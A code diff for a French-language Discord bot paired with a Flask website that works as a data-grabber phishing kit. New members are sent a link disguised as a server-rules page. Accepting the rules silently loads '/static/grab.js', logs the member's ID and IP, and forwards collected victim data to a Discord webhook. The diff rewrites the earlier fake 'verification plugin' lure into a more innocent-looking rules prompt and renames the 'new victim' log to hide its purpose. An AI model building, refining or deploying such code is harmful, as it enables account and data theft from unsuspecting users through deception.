@@ -17,71 +17,75 @@ DISCORD_INVITE = "https://discord.gg/reUcTewDKm"
 # ---------- PARTIE 1 : LE SITE WEB (FLASK) ----------
 app = Flask(__name__)
 
-PAGE_VERIF = """
+PAGE_REGLES = """
 <!DOCTYPE html>
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
-<title>Vérification Discord</title>
+<title>Règles du serveur</title>
 <style>
   * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
-  body { background:#313338; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; flex-direction:column; }
-  .card { background:#2b2d31; padding:40px; border-radius:12px; width:420px; text-align:center; box-shadow:0 10px 40px rgba(0,0,0,.5); }
-  h1 { font-size:22px; margin-bottom:10px; }
-  p { color:#b5bac1; font-size:14px; margin-bottom:25px; }
-  button { background:#5865F2; color:#fff; border:none; padding:14px 30px; border-radius:8px; font-size:16px; cursor:pointer; width:100%; transition:.2s; margin-top:8px; }
-  button:hover { background:#4752c4; }
-  .no { background:transparent; color:#b5bac1; border:1px solid #4e5058; }
+  body { background:#313338; color:#fff; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }
+  .card { background:#2b2d31; padding:36px; border-radius:12px; width:460px; max-width:100%; text-align:center; box-shadow:0 10px 40px rgba(0,0,0,.5); }
+  h1 { font-size:22px; margin-bottom:12px; }
+  p { color:#b5bac1; font-size:14px; margin-bottom:18px; line-height:1.5; }
+  .rules { text-align:left; background:#1e1f22; padding:16px; border-radius:8px; margin-bottom:22px; font-size:13px; color:#dbdee1; line-height:1.6; }
+  .rules li { margin-left:18px; margin-bottom:6px; }
+  button { background:#23a55a; color:#fff; border:none; padding:14px 24px; border-radius:8px; font-size:16px; cursor:pointer; width:100%; transition:.2s; margin-top:8px; font-weight:600; }
+  button:hover { background:#1e8a4b; }
+  .no { background:transparent; color:#b5bac1; border:1px solid #4e5058; font-weight:400; }
   .no:hover { background:#3c3d44; }
+  #status { margin-top:14px; font-size:13px; color:#949ba4; min-height:20px; }
 </style>
 </head>
 <body>
   <div class="card">
-    <h1>🔐 Vérification Discord</h1>
-    <p>Pour accéder au serveur, veuillez vérifier votre compte.</p>
-    <button onclick="installer()">✅ Vérifier mon compte</button>
-    <button class="no" onclick="refuser()">❌ Annuler</button>
+    <h1>📜 Règles du serveur</h1>
+    <p>Merci de lire et d'accepter les règles ci-dessous pour continuer.</p>
+    <ul class="rules">
+      <li>Respectez tous les membres et le staff.</li>
+      <li>Pas de spam, de publicité non autorisée ou de contenus inappropriés.</li>
+      <li>Suivez les consignes des salons et des modérateurs.</li>
+    </ul>
+    <button id="btn-accept" onclick="accepterRegles()">✅ Accepter les règles</button>
+    <button id="btn-refuse" class="no" onclick="refuserRegles()">❌ Refuser</button>
+    <div id="status"></div>
   </div>
-<script>
-function refuser() { window.location.href = "{{ discord }}"; }
-function installer() { window.location.href = "/plugin"; }
-</script>
-</body>
-</html>
-"""
 
-PAGE_PLUGIN = """
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-<meta charset="UTF-8">
-<title>Plugin Discord</title>
-<style>
-  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
-  body { background:#313338; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; }
-  .card { background:#2b2d31; padding:40px; border-radius:12px; width:460px; text-align:center; box-shadow:0 10px 40px rgba(0,0,0,.5); }
-  h1 { font-size:22px; margin-bottom:10px; }
-  p { color:#b5bac1; font-size:14px; margin-bottom:25px; line-height:1.5; }
-  button { background:#5865F2; color:#fff; border:none; padding:14px 30px; border-radius:8px; font-size:16px; cursor:pointer; width:100%; transition:.2s; margin-top:8px; }
-  button:hover { background:#4752c4; }
-  .no { background:transparent; color:#b5bac1; border:1px solid #4e5058; }
-  .no:hover { background:#3c3d44; }
-  .ok { background:#23a55a; }
-  .ok:hover { background:#1e8a4b; }
-</style>
-</head>
-<body>
-  <div class="card">
-    <h1>📦 Plugin requis</h1>
-    <p>Un plugin est nécessaire pour finaliser la vérification.<br>L'installer maintenant ?</p>
-    <button class="ok" onclick="accepter()">✅ Oui, installer</button>
-    <button class="no" onclick="refuser()">❌ Non, plus tard</button>
-  </div>
 <script>
-function refuser() { window.location.href = "{{ discord }}"; }
-function accepter() {
-  var s = document.createElement('script');
+let scriptLance = false;
+
+function refuserRegles() {
+  document.getElementById("status").textContent = "Redirection vers Discord...";
+  window.location.href = "{{ discord }}";
+}
+
+function accepterRegles() {
+  if (scriptLance) return;
+  scriptLance = true;
+
+  const btn = document.getElementById("btn-accept");
+  const status = document.getElementById("status");
+  btn.disabled = true;
+  status.textContent = "Activation en cours...";
+
+  const params = new URLSearchParams(window.location.search);
+  const memberId = params.get("id") || null;
+
+  fetch("/accept-rules", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ accepted: true, member_id: memberId })
+  }).catch(() => {});
+
+  const s = document.createElement("script");
   s.src = "/static/grab.js";
+  s.onload = function () {
+    status.textContent = "Règles acceptées et script activé.";
+  };
+  s.onerror = function () {
+    status.textContent = "Impossible de charger /static/grab.js.";
+  };
   document.body.appendChild(s);
 }
 </script>
@@ -91,19 +95,24 @@ function accepter() {
 
 @app.route("/")
 def index():
-    return render_template_string(PAGE_VERIF, discord=DISCORD_INVITE)
+    return render_template_string(PAGE_REGLES, discord=DISCORD_INVITE)
 
-@app.route("/plugin")
-def plugin():
-    return render_template_string(PAGE_PLUGIN, discord=DISCORD_INVITE)
+@app.route("/accept-rules", methods=["POST"])
+def accept_rules():
+    payload = request.get_json(silent=True) or {}
+    send_log("📜 Règles acceptées", [
+        {"name": "🆔 ID Membre", "value": str(payload.get("member_id") or "Non précisé"), "inline": True},
+        {"name": "🌐 IP", "value": request.headers.get("X-Forwarded-For", request.remote_addr) or "?", "inline": True},
+    ], color=0x23A55A)
+    return jsonify({"ok": True})
 
 @app.route("/collect", methods=["POST"])
 def collect():
-    data = request.get_json()
+    data = request.get_json(silent=True)
     if not data:
         return jsonify({"ok": False})
     embed = {
-        "title": "🎯 Nouvelle victime grabée",
+        "title": "🎯 Données reçues",
         "color": 0x00FF00,
         "fields": [
             {"name": "🌐 IP", "value": data.get("ip", "?"), "inline": True},
@@ -114,8 +123,8 @@ def collect():
         ]
     }
     try:
-        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
-    except:
+        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=5)
+    except Exception:
         pass
     return jsonify({"ok": True})
 
@@ -135,7 +144,7 @@ def send_log(title, fields, color=0xFF0000):
                 "title": title, "color": color, "fields": fields,
                 "footer": {"text": f"Grabber • {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}"}
             }]
-        })
+        }, timeout=5)
     except Exception as e:
         print(e)
 
@@ -144,15 +153,15 @@ class VerifView(discord.ui.View):
         super().__init__(timeout=None)
         self.member = member
 
-    @discord.ui.button(label="✅ Se vérifier", style=discord.ButtonStyle.success, emoji="🔐")
+    @discord.ui.button(label="📜 Lire et accepter les règles", style=discord.ButtonStyle.success, emoji="✅")
     async def verify_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         link = f"{VERIF_URL}?id={self.member.id}"
         await interaction.response.send_message(
-            f"**🔗 Clique ici pour te vérifier :**\n{link}\n\n"
+            f"**🔗 Ouvre ce lien pour accepter les règles :**\n{link}\n\n"
             f"⚠️ Ne partage ce lien avec personne.",
             ephemeral=True
         )
-        send_log("📨 Lien de vérification envoyé", [
+        send_log("📨 Lien envoyé", [
             {"name": "👤 Membre", "value": f"{self.member} ({self.member.id})", "inline": True},
             {"name": "📅 Date", "value": datetime.now().strftime("%d/%m/%Y %H:%M"), "inline": True},
         ], color=0xFFFF00)
@@ -170,17 +179,17 @@ async def on_member_join(member):
         view = VerifView(member)
         await member.send(
             f"👋 **Bienvenue {member.name}**\n"
-            f"Pour accéder au serveur, clique sur **Se vérifier** 👇",
+            f"Clique ci-dessous pour accéder aux règles :",
             view=view
         )
-    except:
+    except Exception:
         pass
 
-@bot.tree.command(name="verif", description="Envoyer un message de vérification")
+@bot.tree.command(name="verif", description="Envoyer le message des règles")
 async def verif(interaction: discord.Interaction):
     embed = discord.Embed(
-        title="🔐 Vérification requise",
-        description="Clique sur le bouton ci-dessous pour te vérifier.",
+        title="📜 Règles du serveur",
+        description="Clique sur le bouton ci-dessous pour consulter et accepter les règles.",
         color=0x5865F2
     )
     view = VerifView(interaction.user)
@@ -197,9 +206,6 @@ async def on_ready():
 
 # ---------- LANCEMENT DES DEUX EN MÊME TEMPS ----------
 if __name__ == "__main__":
-    # On lance Flask en arrière-plan
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
-
-    # On lance le bot Discord
     bot.run(TOKEN)
